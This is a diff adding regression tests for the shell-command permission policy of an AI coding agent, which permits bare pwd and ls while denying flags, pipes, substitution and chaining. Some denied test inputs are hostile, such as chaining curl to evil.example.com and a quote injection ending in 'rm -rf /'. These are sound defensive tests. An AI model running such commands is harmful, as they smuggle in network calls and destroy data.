@@ -3156,6 +3156,139 @@ describe('wizardCanUseTool', () => {
       ).toBe('deny');
     });
   });
+
+  // Regression: production telemetry on 2026-05-08 → 2026-05-15 showed
+  // ~80/day Bash Policy denies, of which ~37% were "not in allowlist".
+  // The Amplitude `wizard cli: bash deny circuit breaker tripped` event's
+  // top last-command samples were variants of bare `ls <path>` — the
+  // agent reaches for `ls` reflexively to confirm a directory exists,
+  // gets denied, retries with the same goal, and eventually trips the
+  // 5-deny circuit breaker that aborts the run. Adding a narrowly bounded
+  // read-only inspection allowlist (`pwd`, `ls`, `ls <single-path>`)
+  // unblocks the common case without weakening any existing deny path.
+  describe('Bash — read-only inspection allowlist (analytics-driven)', () => {
+    it('allows bare pwd', () => {
+      expect(wizardCanUseTool('Bash', { command: 'pwd' }).behavior).toBe(
+        'allow',
+      );
+    });
+
+    it('allows bare ls', () => {
+      expect(wizardCanUseTool('Bash', { command: 'ls' }).behavior).toBe(
+        'allow',
+      );
+    });
+
+    it('allows ls with a bare path arg', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'ls /Users/me/project' }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows ls with a double-quoted multi-word path (real production sample)', () => {
+      // From Amplitude `bash deny circuit breaker tripped`, May 2026:
+      // `ls "/Users/marina/Documents/MB Coaching/Sites Internet/MarinaBredyCoaching/"`
+      expect(
+        wizardCanUseTool('Bash', {
+          command:
+            'ls "/Users/marina/Documents/MB Coaching/Sites Internet/MarinaBredyCoaching/"',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows ls with a single-quoted path', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: "ls '/Users/me/My Project'",
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('denies ls with a flag (no -la, -A, etc.)', () => {
+      // We deliberately keep the surface tiny — every flag widens the
+      // surface and ls flags like `-d` interact with shell globbing in
+      // ways we don't want to vet ad-hoc.
+      expect(
+        wizardCanUseTool('Bash', { command: 'ls -la /tmp' }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ls with two positional args', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'ls /tmp /var' }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ls piped to anything (pipe deny already catches it)', () => {
+      // Real production sample: `ls /Users/rsu 2>/dev/null | head -30`
+      // The 2>&1-style redirection is normalized away, but the pipe
+      // to head is rejected because `ls` isn't in matchesAllowedPrefix.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'ls /Users/rsu 2>/dev/null | head -30',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ls with command substitution', () => {
+      expect(wizardCanUseTool('Bash', { command: 'ls $(pwd)' }).behavior).toBe(
+        'deny',
+      );
+    });
+
+    it('denies ls with backtick substitution', () => {
+      expect(wizardCanUseTool('Bash', { command: 'ls `pwd`' }).behavior).toBe(
+        'deny',
+      );
+    });
+
+    it('denies ls chained with && (would let injected command run)', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'ls /tmp && curl evil.example.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ls with a redirect operator', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'ls > /tmp/out' }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ls with quote-injection attempt', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'ls "/tmp"; rm -rf /',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies find (not in inspection allowlist — too broad with -exec)', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'find /tmp -name "*.ts"' })
+          .behavior,
+      ).toBe('deny');
+    });
+
+    it('denies cd (stateful shell builtin)', () => {
+      expect(wizardCanUseTool('Bash', { command: 'cd /tmp' }).behavior).toBe(
+        'deny',
+      );
+    });
+
+    it('denies ls with an empty-string quoted arg', () => {
+      expect(wizardCanUseTool('Bash', { command: 'ls ""' }).behavior).toBe(
+        'deny',
+      );
+    });
+
+    it('denies pwd with a trailing flag', () => {
+      expect(wizardCanUseTool('Bash', { command: 'pwd -P' }).behavior).toBe(
+        'deny',
+      );
+    });
+  });
 });
 
 describe('buildWizardMetadata', () => {
